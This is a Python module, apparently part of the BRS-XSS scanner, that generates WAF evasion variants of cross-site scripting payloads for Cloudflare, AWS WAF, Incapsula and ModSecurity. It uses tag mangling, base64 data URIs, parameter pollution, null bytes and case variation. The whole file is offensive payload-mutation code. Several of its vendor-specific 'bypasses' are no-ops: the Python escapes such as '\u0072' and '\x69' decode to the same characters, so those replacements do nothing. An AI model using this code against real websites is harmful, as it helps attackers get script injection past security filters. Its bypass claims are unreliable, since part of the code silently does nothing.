#!/usr/bin/env python3

"""
BRS-XSS WAF-Specific Evasion

WAF-specific bypass techniques for different vendors.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: Sat 02 Aug 2025 09:35:54 MSK
Telegram: https://t.me/EasyProTech
"""

import base64
from typing import List, Optional


class WAFSpecificEvasion:
    """WAF-specific bypass techniques"""
    
    @staticmethod
    def cloudflare_evasion(payload: str) -> List[str]:
        """Cloudflare bypass techniques"""
        evasions = []
        
        # Cloudflare bypasses
        evasions.append(payload.replace('<script>', '<script/x>'))
        evasions.append(payload.replace('alert', 'ale\u0072t'))
        evasions.append(payload.replace('>', '//>'))
        evasions.append(payload.replace(' ', '/**/'))
        
        # Data URI bypass
        b64_payload = base64.b64encode(payload.encode()).decode()
        evasions.append(f'data:text/html;base64,{b64_payload}')
        
        return evasions
    
    @staticmethod
    def aws_waf_evasion(payload: str) -> List[str]:
        """AWS WAF bypass techniques"""
        evasions = []
        
        # AWS WAF bypasses
        evasions.append(payload.replace('script', 'scr\x69pt'))
        evasions.append(payload.replace('=', '\x3d'))
        evasions.append(payload.replace('<', '\x3c'))
        
        # Parameter pollution
        if '=' in payload:
            key, value = payload.split('=', 1)
            evasions.append(f'{key}=dummy&{key}={value}')
        
        return evasions
    
    @staticmethod
    def incapsula_evasion(payload: str) -> List[str]:
        """Incapsula bypass techniques"""
        evasions = []
        
        # Incapsula bypasses
        evasions.append(payload.replace('alert', 'window["ale"+"rt"]'))
        evasions.append(payload.replace('<script>', '<script charset="utf-8">'))
        evasions.append(payload.replace('onload', 'on\u006coad'))
        
        return evasions
    
    @staticmethod
    def modsecurity_evasion(payload: str) -> List[str]:
        """ModSecurity bypass techniques"""
        evasions = []
        
        # ModSecurity bypasses
        evasions.append(payload.replace(' ', '\t'))
        evasions.append(payload.replace('script', 'ScRiPt'))
        evasions.append(payload.replace('=', '=\x00'))
        
        # Case variation
        evasions.append(''.join([c.upper() if i % 2 == 0 else c.lower() 
                                for i, c in enumerate(payload)]))
        
        return evasions